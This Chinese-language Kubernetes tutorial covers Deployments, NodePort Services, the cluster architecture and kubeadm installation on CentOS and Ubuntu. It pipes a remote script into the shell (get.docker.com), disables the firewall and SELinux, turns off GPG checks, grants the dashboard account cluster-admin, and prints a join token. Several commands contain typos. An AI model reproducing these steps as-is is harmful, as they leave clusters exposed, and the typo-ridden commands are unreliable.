<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">extensions/v1beta1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">service-test</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">2</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLables:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">service_test_pod</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">service_test_pod</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">simple-http</span></span><br><span class="line">          <span class="attr">image:</span> <span class="string">python:2.7</span></span><br><span class="line">          <span class="attr">imagePullPolicy:</span>  <span class="string">IfNotPresent</span></span><br><span class="line">          <span class="attr">command:</span>  [<span class="string">&quot;/bin/bash&quot;</span>]</span><br><span class="line">          <span class="attr">args:</span> [<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;echo \&quot; &lt;p&gt;Hello from $(hostname)&lt;/p&gt;\&quot; &gt; index.html; python -m SimpleHTTPServer 8080&quot;</span>]</span><br><span class="line">          <span class="attr">ports:</span> </span><br><span class="line">            <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">http</span></span><br><span class="line">              <span class="attr">containerPort:</span> <span class="number">8080</span></span><br></pre></td></tr></table></figure>

<p>创建Department：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建Deployment</span></span><br><span class="line">kybectl create -f deployment_python_http.yml</span><br><span class="line"><span class="comment"># 创建服务</span></span><br><span class="line">kubectl expose deployment service-test</span><br><span class="line"><span class="comment"># 查看服务</span></span><br><span class="line">kubectl get svc</span><br></pre></td></tr></table></figure>

<p>下面编辑yml文件，准备更新：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kubectl edit deployment service-test</span><br></pre></td></tr></table></figure>

<p>更改echo内容，保存退出，Pod就被更新了。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 删除服务</span></span><br><span class="line">kubectl delete services nginx-deployment</span><br></pre></td></tr></table></figure>

<h3 id="NodePort"><a href="#NodePort" class="headerlink" title="NodePort"></a>NodePort</h3><p>创建文件<code>pod_nginx.yml</code>：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nginx-pod</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">nginx</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span> </span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx-container</span></span><br><span class="line">      <span class="attr">image:</span> <span class="string">nginx</span></span><br><span class="line">      <span class="attr">ports:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx-port</span></span><br><span class="line">          <span class="attr">containerPort:</span> <span class="number">80</span></span><br></pre></td></tr></table></figure>

<p>创建Pod：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kubectl create -f pod_nginx.yml</span><br></pre></td></tr></table></figure>

<p>为Pod指定服务：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kubectl expose pods nginx-pod --<span class="built_in">type</span>=NodePort</span><br><span class="line"><span class="comment"># 查看服务</span></span><br><span class="line">kubectl get svc</span><br></pre></td></tr></table></figure>

<p>这样就可以通过Node访问到服务了。但是一但Pod被关闭，服务就无法使用了。因此可以使用下面的方法：</p>
<p>创建<code>service_nginx.yml</code>：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Service</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nginx-service</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">port:</span> <span class="number">32333</span> <span class="comment"># 此两处必须介于30000到32768</span></span><br><span class="line">      <span class="attr">nodePort:</span> <span class="number">32333</span></span><br><span class="line">      <span class="attr">targetPort:</span> <span class="string">nginx-port</span></span><br><span class="line">      <span class="attr">protocol:</span> <span class="string">TCP</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">nginx</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">NodePort</span></span><br></pre></td></tr></table></figure>

<p>开启服务：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kubectl create -f service_nginx.yml</span><br></pre></td></tr></table></figure>

<p>之后就可以访问了。</p>
<p>kops</p>
<p>kops是Kubernetes自己开发的用于生产环境的工具。</p>
<p><a href="https://github.com/kubernetes/kops">kops Github页面</a></p>
<p>安装方法：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">curl -LO https://github.com/kubernetes/kops/releases/download/$(curl -s https://api.github.com/repos/kubernetes/kops/releases/latest | grep tag_name | <span class="built_in">cut</span> -d <span class="string">&#x27;&quot;&#x27;</span> -f 4)/kops-linux-amd64</span><br><span class="line"><span class="built_in">chmod</span> +x kops-linux-amd64</span><br><span class="line">sudo <span class="built_in">mv</span> kops-linux-amd64 /usr/local/bin/kops</span><br></pre></td></tr></table></figure>

<p>建立集群：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kops create cluster --node-count=2 --name=k8s</span><br></pre></td></tr></table></figure>

<p>删除集群：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kops delete cluster --name=k8s --<span class="built_in">yes</span></span><br></pre></td></tr></table></figure>



<h1 id="架构-1"><a href="#架构-1" class="headerlink" title="架构"></a>架构</h1><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211128152526212.png" alt="image-20211128152526212"></p>
<h2 id="API-Server"><a href="#API-Server" class="headerlink" title="API Server"></a>API Server</h2><p>K8S 的Rest接口，所有组件都来访问这个。</p>
<h2 id="Controller-Manager"><a href="#Controller-Manager" class="headerlink" title="Controller Manager"></a>Controller Manager</h2><p>维持副本期望数目。</p>
<h2 id="Scheduler"><a href="#Scheduler" class="headerlink" title="Scheduler"></a>Scheduler</h2><p>接受任务，选择节点分配任务。</p>
<h2 id="ETCD"><a href="#ETCD" class="headerlink" title="ETCD"></a>ETCD</h2><p>分布式键值数据库，Rest接口。</p>
<h2 id="Kubelet"><a href="#Kubelet" class="headerlink" title="Kubelet"></a>Kubelet</h2><p>操作 容器，维持Pod生命周期</p>
<h2 id="KubeProxy"><a href="#KubeProxy" class="headerlink" title="KubeProxy"></a>KubeProxy</h2><p>写入规则到 iptables，ipvs 实现服务映射。</p>
<h2 id="CoreDNS"><a href="#CoreDNS" class="headerlink" title="CoreDNS"></a>CoreDNS</h2><p>可以为集群中的SVC创建A记录。</p>
<h2 id="Ingress-Controller"><a href="#Ingress-Controller" class="headerlink" title="Ingress Controller"></a>Ingress Controller</h2><p>实现七层代理。官方只有四层代理。</p>
<h2 id="Fedetation"><a href="#Fedetation" class="headerlink" title="Fedetation"></a>Fedetation</h2><p>提供多K8S统一管理。</p>
<h2 id="Dashboard"><a href="#Dashboard" class="headerlink" title="Dashboard"></a>Dashboard</h2><p>提供K8S访问接口。</p>
<h2 id="Prometheus"><a href="#Prometheus" class="headerlink" title="Prometheus"></a>Prometheus</h2><p>提供K8S监控。</p>
<h2 id="ELK"><a href="#ELK" class="headerlink" title="ELK"></a>ELK</h2><p>提供K8S集群日志统一分析平台。</p>
<h1 id="控制器"><a href="#控制器" class="headerlink" title="控制器"></a>控制器</h1><p>ReplicationController - 始终保持Pod为用户定义数量，多删少补。</p>
<p>ReplicaSet - 同ReplicationController，建议使用ReplicaSet。支持集合式Selector（根据Pod Label匹配）。命令式：使用<code>create</code>启动。</p>
<p>Deployment - 自动管理ReplicaSet和Pot，支持滚动更新，回滚，扩容，缩容，暂停，继续。声明式：使用<code>apply</code>启动。</p>
<p>DaemonSet - 确保某些Node上运行一个Pod副本。会根据Node加入和离开动态创建Pod。守护进程、运行监控、日志、集群存储。</p>
<p>Job - 负责批处理任务，仅执行一次。如果退出代码非 0 会重新执行。</p>
<p>Cron Job - 基于时间的Job。</p>
<p>StatefulSet - 解决有状态服务问题。场景：持久化存储、命名网络、有序部署、有序扩展、有序收缩。</p>
<p>HPA - 支持根据资源使用率伸缩集群节点数量。可以控制控制器。</p>
<h1 id="网络通信方式"><a href="#网络通信方式" class="headerlink" title="网络通信方式"></a>网络通信方式</h1><p>同一个Pod内部使用Localhost访问。</p>
<p>所有Pod可以通过对方IP直接访问（Overlay）。采用Flanneld。</p>
<p>Pod与Service采用iptables、Lvs方式等。</p>
<p>Pod到外网，使用Stun。</p>
<p>外网访问Pod，使用Service。</p>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>官方安装教程：<a href="https://kubernetes.io/zh/docs/setup/production-environment/tools/kubeadm/install-kubeadm/">安装 kubeadm | Kubernetes</a></p>
<p>Master x 1 + Node x 2 + Harbor（镜像仓库） + Router（软路由，采用koolshare）。</p>
<p>创建以上5台虚拟机。</p>
<p>网络架构</p>
<p>主机网络 -&gt; Koolshare -&gt; K8s x 3</p>
<p>设置主机名、MAC、Host文件、UUID，保证相互访问。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hostnamectl set-hostname k8s-master </span><br><span class="line">cat /sys/class/dmi/id/product_uuid</span><br></pre></td></tr></table></figure>

<p>需要安装IPVS。</p>
<h2 id="CentOS"><a href="#CentOS" class="headerlink" title="CentOS"></a>CentOS</h2><p>安装依赖</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">yum install -y conntrack ntpdate ipvsadm ipset jq iptables curl sysstat libseccomp wget vim net-tools git</span><br></pre></td></tr></table></figure>

<p>关闭防火墙</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">system stop firewalld &amp;&amp; systemctl <span class="built_in">disable</span> firewalld</span><br><span class="line">yum -y install iptables-services &amp;&amp; systemctl start iptables &amp;&amp; systemctl <span class="built_in">enable</span> iptables &amp;&amp; iptables -F &amp;&amp; service iptables save</span><br></pre></td></tr></table></figure>

<p>关闭 SELinux</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">swapoff -a &amp;&amp; sed -i <span class="string">&#x27;/ swap / s/^\(.*\)$/#\1/g&#x27;</span> /etc/fstab </span><br><span class="line">setenforce 0 &amp;&amp; sed -i <span class="string">&#x27;s/^SELINUX=.*/SELINUX=disabled/&#x27;</span> /etc/selinux/config</span><br></pre></td></tr></table></figure>

<p>调整内核参数</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> &gt; kubernetes.conf &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">net.bridge.bridge-nf-call-iptables=1</span></span><br><span class="line"><span class="string">net.bridge.bridge-nf-call-ip6tables=1</span></span><br><span class="line"><span class="string">net.ipv4.ip_forward=1</span></span><br><span class="line"><span class="string">net.ipv4.tcp_tw_recycle=0</span></span><br><span class="line"><span class="string">vm.swappiness=0</span></span><br><span class="line"><span class="string">vm.overcommit_memory=1</span></span><br><span class="line"><span class="string">vm.panic_on_oom=0</span></span><br><span class="line"><span class="string">fs.inotify.max_user_instances=8192</span></span><br><span class="line"><span class="string">fs.inotify.max_user_watches=1048576</span></span><br><span class="line"><span class="string">fs.file-max=52706963</span></span><br><span class="line"><span class="string">fs.nr_open=52706963</span></span><br><span class="line"><span class="string">net.ipv6.conf.all.disable_ipv6=1</span></span><br><span class="line"><span class="string">net.netfilter.nf_conntrack_max=2310720</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"><span class="built_in">cp</span> kubernetes.conf /etc/sysctl.d/kubernetes.conf</span><br><span class="line">sysctl -p /etc/sysctl.d/kubernetes.conf</span><br></pre></td></tr></table></figure>

<p>调整时区</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">timedatectl set-timezone Asia/Shanghai</span><br><span class="line">timedatectl set-local-rtc 0</span><br><span class="line">systemctl restart rsyslog</span><br><span class="line">systemctl restart crond</span><br></pre></td></tr></table></figure>

<p>关闭不需要的服务</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">systemctl stop postfix &amp;&amp; systemctl <span class="built_in">disable</span> postfix</span><br></pre></td></tr></table></figure>

<p>设置rsyslogd和systemd journald</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /var/log/journal</span><br><span class="line"><span class="built_in">mkdir</span> /etc/systemd/journald.conf.d</span><br><span class="line"><span class="built_in">cat</span> &gt; /etc/systemd/journald.conf.d/99-prophet.conf &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">[Journal]</span></span><br><span class="line"><span class="string">Storage=persistent</span></span><br><span class="line"><span class="string">Compress=yes</span></span><br><span class="line"><span class="string">SyncIntervalSec=5m</span></span><br><span class="line"><span class="string">RateLimitInberval=30s</span></span><br><span class="line"><span class="string">RateLimitBurst=1000</span></span><br><span class="line"><span class="string">SystemMaxUse=10G</span></span><br><span class="line"><span class="string">SystemMaxFileSize=200M</span></span><br><span class="line"><span class="string">MaxRetentionSec=2week</span></span><br><span class="line"><span class="string">ForwardToSyslog=no</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">systemctl restart systemd-journald</span><br></pre></td></tr></table></figure>

<p>Kube-Proxy 开启IPVS 前置条件</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">modprobe br_netfilter</span><br><span class="line"><span class="built_in">cat</span> &gt; /etc/sysconfig/modules/ipvs.modules &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">#!/bin/bash</span></span><br><span class="line"><span class="string">modprobe -- ip_vs</span></span><br><span class="line"><span class="string">modprobe -- ip_vs_rr</span></span><br><span class="line"><span class="string">modprobe -- ip_vs_wrr</span></span><br><span class="line"><span class="string">modprobe -- ip_vs_sh</span></span><br><span class="line"><span class="string">modprobe -- nf_conntrack_ipv4</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"><span class="built_in">chmod</span> 755 /etc/sysconfig/modules/ipvs.modules &amp;&amp; bash /etc/sysconfig/modules/ipvs.modules &amp;&amp; lsmod | grep -e ip_vs -e nf_conntrack_ipv4</span><br></pre></td></tr></table></figure>

<p>安装Docker</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">curl -sSL https://get.docker.com | sh</span><br><span class="line">sudo <span class="built_in">cat</span>&gt;/etc/docker/daemon.json&lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">  &quot;registry-mirrors&quot;: [&quot;https://sfpj1t4c.mirror.aliyuncs.com&quot;],</span></span><br><span class="line"><span class="string">  &quot;log-driver&quot;: &quot;json-file&quot;,</span></span><br><span class="line"><span class="string">  &quot;log-opts&quot;: &#123;</span></span><br><span class="line"><span class="string">  	&quot;max-size&quot;: &quot;100m&quot;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">sudo systemctl daemon-reload  <span class="comment"># 加载阿里云加速镜像</span></span><br><span class="line">sudo systemctl restart docker</span><br><span class="line">sudo groupadd docker    <span class="comment"># 添加当前用户到docker组</span></span><br><span class="line">sudo usermod -aG docker <span class="variable">$USER</span></span><br><span class="line">newgrp docker</span><br><span class="line">sudo apt-get install -y docker-compose   <span class="comment"># 安装 docker compose</span></span><br></pre></td></tr></table></figure>

<p>安装Kubeadm</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> &gt; /etc/yum.repos.d/kubernetes.repo &lt;&lt; <span class="string">EOF</span></span><br><span class="line"><span class="string">[kubernetes]</span></span><br><span class="line"><span class="string">name=Kubernetes</span></span><br><span class="line"><span class="string">baseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64</span></span><br><span class="line"><span class="string">enabled=1</span></span><br><span class="line"><span class="string">gpgcheck=0</span></span><br><span class="line"><span class="string">repo_gpgcheck=0</span></span><br><span class="line"><span class="string">gpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg https://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">yum install -y kubelet-1.16.0 kubeadm-1.16.0 kubectl-1.16.0</span><br><span class="line">systemctl <span class="built_in">enable</span> kubelet</span><br></pre></td></tr></table></figure>

<p>部署Master</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kubeadm init \</span><br><span class="line">  --apiserver-advertise-address=192.168.153.34 \</span><br><span class="line">  --image-repository registry.aliyuncs.com/google_containers \</span><br><span class="line">  --kubernetes-version v1.16.0 \</span><br><span class="line">  --service-cidr=10.1.0.0/16 \</span><br><span class="line">  --pod-network-cidr=10.244.0.0/16</span><br><span class="line"><span class="built_in">mkdir</span> -p <span class="variable">$HOME</span>/.kube</span><br><span class="line">sudo <span class="built_in">cp</span> -i /etc/kubernetes/admin.conf <span class="variable">$HOME</span>/.kube/config</span><br><span class="line">sudo <span class="built_in">chown</span> $(<span class="built_in">id</span> -u):$(<span class="built_in">id</span> -g) <span class="variable">$HOME</span>/.kube/config</span><br></pre></td></tr></table></figure>

<p>或</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kubeadm config <span class="built_in">print</span> init-defaults &gt; kubeadm-config.yaml</span><br><span class="line">kubeadm init --config=kubeadm-config.yaml --experimental-upload-certs | <span class="built_in">tee</span> kubeadm-init.log</span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kubeadm-config.yaml</span></span><br><span class="line"><span class="attr">localAPIEndpoint:</span></span><br><span class="line">  <span class="attr">advertiseAddress:</span> <span class="number">192.168</span><span class="number">.66</span><span class="number">.10</span> <span class="comment"># Master</span></span><br><span class="line"><span class="attr">kubernetesVersion:</span> <span class="string">v1.15.1</span></span><br><span class="line"><span class="attr">networking:</span></span><br><span class="line">  <span class="attr">podSubnet:</span> <span class="string">&quot;10.244.0.0/16&quot;</span></span><br><span class="line">  <span class="attr">serviceSubnet:</span> <span class="string">&quot;10.96.0.0/12&quot;</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">kubeproxy.conf.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">KubeProxyConfiguration</span></span><br><span class="line"><span class="attr">featureGates:</span></span><br><span class="line">  <span class="attr">SupportIPVSProxyMode:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">mode:</span> <span class="string">ipvs</span></span><br></pre></td></tr></table></figure>

<p>为普通用户创建kubectl的token</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p <span class="variable">$HOME</span>/.kube</span><br><span class="line">sudo <span class="built_in">cp</span> -i /etc/kubernetes/admin.conf <span class="variable">$HOME</span>/.kube/config</span><br><span class="line">sudo <span class="built_in">chown</span> $(<span class="built_in">id</span> -u):$(<span class="built_in">id</span> -g) <span class="variable">$HOME</span>/.kube/config</span><br></pre></td></tr></table></figure>

<p>部署Flannel插件</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kubectl apply -f https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml</span><br></pre></td></tr></table></figure>

<p>查看运行状态</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kubectl get pod -n kube-system -o wide -w</span><br><span class="line">kubectl get node</span><br></pre></td></tr></table></figure>

<p>加入Worker</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kubeadm <span class="built_in">join</span> 192.168.66.10:6443 --token 6qf11n.pdyzp2zki1ydb2fc \</span><br><span class="line">    --discovery-token-ca-cert-hash sha256:e9055d8b3cfcf40330124f5da18e820ebcb6eb9ff28eb64c0f593e0fb154b755</span><br></pre></td></tr></table></figure>



<h2 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h2><p>关闭防火墙</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo ufw <span class="built_in">disable</span></span><br></pre></td></tr></table></figure>

<p>禁用 Swap</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo swapoff -a</span><br><span class="line"><span class="comment">#修改/etc/fstab，注释掉swap那行，持久化生效</span></span><br><span class="line">sudo vi /etc/fstab</span><br></pre></td></tr></table></figure>

<p>修改时区</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo timedatectl set-timezone Asia/Shanghai</span><br><span class="line">sudo systemctl restart rsyslog </span><br></pre></td></tr></table></figure>

<p>设置可以看到bridged traffic</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> &lt;&lt;<span class="string">EOF | sudo tee /etc/sysctl.d/k8s.conf</span></span><br><span class="line"><span class="string">net.bridge.bridge-nf-call-ip6tables = 1</span></span><br><span class="line"><span class="string">net.bridge.bridge-nf-call-iptables = 1</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">sudo sysctl --system</span><br></pre></td></tr></table></figure>

<p>设置rp_filter</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#修改/etc/sysctl.d/10-network-security.conf</span></span><br><span class="line">sudo vi /etc/sysctl.d/10-network-security.conf</span><br><span class="line"></span><br><span class="line"><span class="comment">#将下面两个参数的值从2修改为1</span></span><br><span class="line"><span class="comment">#net.ipv4.conf.default.rp_filter=1</span></span><br><span class="line"><span class="comment">#net.ipv4.conf.all.rp_filter=1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#然后使之生效</span></span><br><span class="line">sudo sysctl --system</span><br></pre></td></tr></table></figure>



<p>安装Docker</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">curl -sSL https://get.docker.com | sh</span><br><span class="line">sudo <span class="built_in">cat</span>&gt;&gt;/etc/docker/daemon.json&lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">  &quot;registry-mirrors&quot;: [&quot;https://sfpj1t4c.mirror.aliyuncs.com&quot;]</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">sudo systemctl daemon-reload  <span class="comment"># 加载阿里云加速镜像</span></span><br><span class="line">sudo systemctl restart docker</span><br><span class="line">sudo groupadd docker    <span class="comment"># 添加当前用户到docker组</span></span><br><span class="line">sudo usermod -aG docker <span class="variable">$USER</span></span><br><span class="line">newgrp docker</span><br><span class="line">sudo apt-get install -y docker-compose   <span class="comment"># 安装 docker compose</span></span><br></pre></td></tr></table></figure>

<p>安装 Kubeadm</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt-get update &amp;&amp; sudo apt-get install -y ca-certificates curl software-properties-common apt-transport-https curl</span><br><span class="line">curl -s https://mirrors.aliyun.com/kubernetes/apt/doc/apt-key.gpg | sudo apt-key add -</span><br><span class="line"></span><br><span class="line">sudo <span class="built_in">tee</span> /etc/apt/sources.list.d/kubernetes.list &lt;&lt;<span class="string">EOF </span></span><br><span class="line"><span class="string">deb https://mirrors.aliyun.com/kubernetes/apt/ kubernetes-xenial main</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y kubelet kubeadm kubectl</span><br><span class="line">sudo apt-mark hold kubelet kubeadm kubectl</span><br></pre></td></tr></table></figure>

<p>初始化</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo kubeadm init --pod-network-cidr 172.16.0.0/16 \</span><br><span class="line">    --image-repository registry.cn-hangzhou.aliyuncs.com/google_containers</span><br></pre></td></tr></table></figure>

<p>为普通用户创建kubectl的token</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p <span class="variable">$HOME</span>/.kube</span><br><span class="line">sudo <span class="built_in">cp</span> -i /etc/kubernetes/admin.conf <span class="variable">$HOME</span>/.kube/config</span><br><span class="line">sudo <span class="built_in">chown</span> $(<span class="built_in">id</span> -u):$(<span class="built_in">id</span> -g) <span class="variable">$HOME</span>/.kube/config</span><br></pre></td></tr></table></figure>

<p>安装Calico</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#下载 https://docs.projectcalico.org/v3.11/manifests/calico.yaml</span></span><br><span class="line"><span class="comment">#修改CALICO_IPV4POOL_CIDR，然后</span></span><br><span class="line">kubectl apply -f calico.yaml</span><br></pre></td></tr></table></figure>

<p>安装Worker</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kubeadm <span class="built_in">join</span> 192.168.0.95:6443 --token x.xxx \</span><br><span class="line">        --discovery-token-ca-cert-hash sha256:xxxxx</span><br></pre></td></tr></table></figure>

<p>安装Dashboard</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kubectl apply -f https://raw.githubusercontent.com/kubernetes/dashboard/v2.0.0/aio/deploy/recommended.yaml</span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 可以下载下来自己配置</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Service</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">k8s-app:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">port:</span> <span class="number">17030</span></span><br><span class="line">      <span class="attr">targetPort:</span> <span class="number">8443</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">NodePort</span></span><br><span class="line">  <span class="attr">externalIPs:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">192.168</span><span class="number">.0</span><span class="number">.95</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">k8s-app:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line">    </span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">admin-user</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line">  </span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRoleBinding</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">admin-user</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">cluster-admin</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">admin-user</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kubernetes-dashboard</span></span><br></pre></td></tr></table></figure>

<p>获取登录所需的token</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kubectl -n kubernetes-dashboard describe secret $(kubectl -n kubernetes-dashboard get secret | grep admin-user | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>安装Controller Ingress</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-0.32.0/deploy/static/provider/baremetal/deploy.yaml</span><br></pre></td></tr></table></figure>

